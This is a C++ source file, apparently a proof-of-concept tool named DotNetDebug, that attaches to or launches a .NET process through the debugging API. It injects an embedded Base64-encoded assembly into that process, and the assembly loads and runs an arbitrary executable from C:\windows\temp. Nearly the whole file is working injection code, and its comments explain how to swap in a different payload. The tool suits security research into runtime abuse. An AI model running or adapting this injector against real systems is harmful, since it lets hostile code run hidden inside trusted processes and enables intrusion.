#include "Common.h"
#include "ManagedHandler.h"
#include "Debugger.h"
#include "DebuggerHelper.h"
#include "ManagedHandler.h"

#pragma comment(lib, "mscoree.lib")
#pragma comment(lib, "CorGuids.lib")

// Base64 encoded simple .NET Assembly which will load a .NET EXE from C:\windows\temp\inject.exe and execute its entrypoint:
// namespace Injected {
//  class Injected {
//    public static void ThreadEntry()
//    {
//  	Console.WriteLine(@"Attempting to load C:\windows\temp\inject.exe");
//  	try
//  	{
//  		var asm = Assembly.LoadFile(@"C:\windows\temp\inject.exe");
//  		asm.EntryPoint.Invoke(null, new object[]{ new string[] { } });
//  	}
//  	catch
//  	{
//  		Console.WriteLine(@"Could not load C:\windows\temp\inject.exe");
//  	}
//  	Console.WriteLine("Execution complete...");
//  	Console.ReadLine();
//    }
//
//	  public static void Entry()
//	  {
//		Console.WriteLine("@_xpn_ .NET debugging POC");
//		var thread = new System.Threading.Thread(new ThreadStart(ThreadEntry));
//		thread.Start();
//	  }
//   }
// }
// 
// To swap this for something else, create new .NET assembly named "injected" and expose a static method of Injected.Injected.Entry(), eg:
// namespace Injected {
//   class Injected {
//     public static void Entry() {
//
//     }
//   }
// }
// Compile for "Any CPU" and Base64 encode :)

#define BASE64_ENCODED_ASSEMBLY L"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YXhhdGlvbnNBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBTeXN0ZW0uVGhyZWFkaW5nAFN5c3RlbS5SdW50aW1lLlZlcnNpb25pbmcAU3RyaW5nAGluamVjdGVkLmRsbABTeXN0ZW0AU3lzdGVtLlJlZmxlY3Rpb24ATWV0aG9kSW5mbwAuY3RvcgBTeXN0ZW0uRGlhZ25vc3RpY3MAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMARGVidWdnaW5nTW9kZXMAT2JqZWN0AGdldF9FbnRyeVBvaW50AFRocmVhZFN0YXJ0AEFzc2VtYmx5AFRocmVhZEVudHJ5AAAAAFtBAHQAdABlAG0AcAB0AGkAbgBnACAAdABvACAAbABvAGEAZAAgAEMAOgBcAHcAaQBuAGQAbwB3AHMAXAB0AGUAbQBwAFwAaQBuAGoAZQBjAHQALgBlAHgAZQAANUMAOgBcAHcAaQBuAGQAbwB3AHMAXAB0AGUAbQBwAFwAaQBuAGoAZQBjAHQALgBlAHgAZQAAU0MAbwB1AGwAZAAgAG4AbwB0ACAAbABvAGEAZAAgAEMAOgBcAHcAaQBuAGQAbwB3AHMAXAB0AGUAbQBwAFwAaQBuAGoAZQBjAHQALgBlAHgAZQAAK0UAeABlAGMAdQB0AGkAbwBuACAAYwBvAG0AcABsAGUAdABlAC4ALgAuAAB7SQB0ACAAcwBlAGUAbQBzACAAeQBvAHUAIABhAHIAZQAgAGQAaQBzAGEAcwBzAGUAbQBiAGwAaQBuAGcAIABtAGUALgAuAC4AIABnAG8AbwBkAC4ALgAuACAAeQBvAHUAIABzAGgAbwB1AGwAZAAgAGIAZQAgADsAKQAAM0AAXwB4AHAAbgBfACAALgBOAEUAVAAgAGQAZQBiAHUAZwBnAGkAbgBnACAAUABPAEMAAAC1Rsh1U12ER6pTfpnRRKl/AAQgAQEIAyAAAQUgAQEREQQgAQEOBCABAQIEBwESRQQAAQEOBQABEkUOBCAAElEG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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAwAAAB4OgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="

Debugger *dbg = NULL;
bool gStop = false;

void printIntro() {
	std::cout << "DotNetDebug by @_xpn_\n    A simple POC for exploring the power of the .NET debugger" << std::endl;
}

void printUsage(const char* const* argv) {
		std::cout << "Usage: " << argv[0] << "attach somedotnetapp.exe" << std::endl;
		std::cout << "Usage: " << argv[0] << "attachpid PID" << std::endl;
		std::cout << "Usage: " << argv[0] << "launch C:\\somedotnetapp.exe" << std::endl;
}

int main(int argc, char **argv)
{
	std::vector<ICorDebugAppDomain *> *appDomains = NULL;
	std::vector<ICorDebugAssembly *> *assemblies = NULL;
	std::vector<ICorDebugThread *> *threads = NULL;
	std::vector<std::pair<DWORD, std::wstring>> *processes = NULL;
	DWORD pid = 0;
	HRESULT hr = 0;
	ICorDebugProcess *process = NULL;
	ICorDebugStepper *step;

	printIntro();

	if (argc < 2)
	{
		printUsage(argv);
		return 1;
	}

	auto createStepperCallback = [](ICorDebugAppDomain *pAppDomain, ICorDebugThread *thread) -> bool {
		ICorDebugStepper *stepper;
		if (gStop)
		{
			std::cout << "[!] Not attaching stepper to the new thread" << std::endl;
			return true;
		}
		std::cout << "[*] New thread created, adding a stepper" << std::endl;

		thread->CreateStepper(&stepper);
		stepper->Step(0);
		return false;
	};

	auto stepCompleteCallback = [](ICorDebugAppDomain *pAppDomain, ICorDebugThread *pThread, ICorDebugStepper *pStepper, auto reason) -> bool {
		ICorDebugEval *eval;
		HRESULT hr;

		if (pThread->CreateEval(&eval) != S_OK)
		{
			pStepper->Step(0);
			return false;
		}

		if ((hr = eval->NewString(BASE64_ENCODED_ASSEMBLY)) != S_OK)
		{
			pStepper->Step(0);
			return false;
		}

		std::cout << "[*] Managed to eval string, looks like we have a thread to use.. w00000t :)" << std::endl;

		// Get our threadID
		// DWORD threadID;
		// pThread->GetID(&threadID);

		// std::cout << "[*] ThreadId " << threadID << std::endl;
		gStop = true;

		pStepper->Deactivate();

		std::cout << "[*] All threads except our controlled thread are now suspended :D" << std::endl;

		return true;
	};

	auto evalCompleteCallback1 = [](ICorDebugAppDomain *pAppDomain, ICorDebugThread *pThread, ICorDebugEval *pEval) -> bool {
		ICorDebugValue *value;
		ICorDebugFunction *function;

		if (pEval->GetResult(&value) != S_OK)
		{
			return false;
		}

		if (Debugger::FindMethod(&function, pAppDomain, L"mscorlib.dll", L"System.Convert", L"FromBase64String", 0) != S_OK)
		{
			std::cout << "[!] Fatal: Could not find method System.Convert.FromBase64String in mscorlib.dll" << std::endl;
			exit(2);
		}

		pEval->CallFunction(function, 1, &value);

		return true;
	};

	auto evalCompleteCallback2 = [](ICorDebugAppDomain *pAppDomain, ICorDebugThread *pThread, ICorDebugEval *pEval) -> bool {
		ICorDebugValue *value;
		ICorDebugFunction *function;

		if (pEval->GetResult(&value) != S_OK)
		{
			return false;
		}

		if (Debugger::FindMethod(&function, pAppDomain, L"mscorlib.dll", L"System.Reflection.Assembly", L"Load", 7) != S_OK)
		{
			std::cout << "[!] Fatal: Could not find method System.Reflection.Assembly.LoadFrom in mscorlib.dll" << std::endl;
			exit(2);
		}

		std::cout << "[*] Calling Assembly.LoadFile" << std::endl;
		pEval->CallFunction(function, 1, &value);

		return true;
	};

	auto evalCompleteCallback3 = [](ICorDebugAppDomain *pAppDomain, ICorDebugThread *pThread, ICorDebugEval *pEval) -> bool {
		ICorDebugValue *value;
		ICorDebugFunction *function;

		if (pEval->GetResult(&value) != S_OK)
		{
			return false;
		}

		if (Debugger::FindMethod(&function, pAppDomain, L"injected", L"Injected.Injected", L"Entry", 0) != S_OK)
		{
			std::cout << "[!] Fatal: Could not find method Injected.Injected.Entry in assembly module 'injected'" << std::endl;
			exit(3);
		}

		std::cout << "[*] Calling our loaded method" << std::endl;
		pEval->CallFunction(function, 0, NULL);

		return true;
	};

	auto evalCompleteCallback4 = [](auto *pAppDomain, auto *pThread, auto *pEval) -> bool {
		std::cout << "[*] Method call completed, detaching..." << std::endl;

		dbg->Detach();

		return true;
	};

	ManagedCallback* callback = new ManagedCallback();

	// Queue up our callbacks to handle events as they occur
	callback->SubscribeCreateThread(createStepperCallback);
	callback->SubscribeStepComplete(stepCompleteCallback);
	callback->SubscribeEvalComplete(evalCompleteCallback1);
	callback->SubscribeEvalComplete(evalCompleteCallback2);
	callback->SubscribeEvalComplete(evalCompleteCallback3);
	callback->SubscribeEvalComplete(evalCompleteCallback4);

	dbg = new Debugger(callback);
	dbg->Init();

	if (std::string(argv[1]).compare("attach") == 0)
	{
		DebuggerHelper::GetProcessList(&processes);

		for (auto p : *processes)
		{
			if (p.second.compare(DebuggerHelper::StringToWString(argv[2])) == 0)
			{
				pid = p.first;
			}
		}

		if (pid == 0)
		{
			std::cout << "[!] Could not find process: " << argv[2] << std::endl;
			return 3;
		}

		std::cout << "[*] Attaching to PID: " << pid << std::endl;

		if ((hr = dbg->Attach(pid)) != S_OK)
		{
			std::cout << "[!] Error attaching to process - HR: " << hr << std::endl;
			return 3;
		}
	}
	else if (std::string(argv[1]).compare("attachpid") == 0)
	{
		if ((hr = dbg->Attach(atoi(argv[2]))) != S_OK)
		{
			std::cout << "[!] Error attaching to process - HR: " << hr << std::endl;
			return 3;
		}
	}
	else if (std::string(argv[1]).compare("launch") == 0)
	{
		std::cout << "[*] Launching process " << argv[2] << std::endl;

		std::wstring output;
		output = DebuggerHelper::StringToWString(argv[2]);

		dbg->Run(output);
	}
	else
	{
		std::cout << "[!] Error: Unknown debug mode passed, should be attach, attachpid or launch" << std::endl;
		return 2;
	}

	std::cout << "[*] Stopping execution of target" << std::endl;
	dbg->Stop();

	std::cout << "[*] Adding steppers to current threads..." << std::endl;
	if (dbg->GetProcess(&process) == S_OK)
	{
		Debugger::GetThreads(&threads, process);
		for (auto thread : *threads) {
			dbg->CreateStepper(&step, thread);
			step->Step(0);
		}
	}

	std::cout << "[*] Continuing execution of target" << std::endl;
	dbg->Continue();
	dbg->Join();
}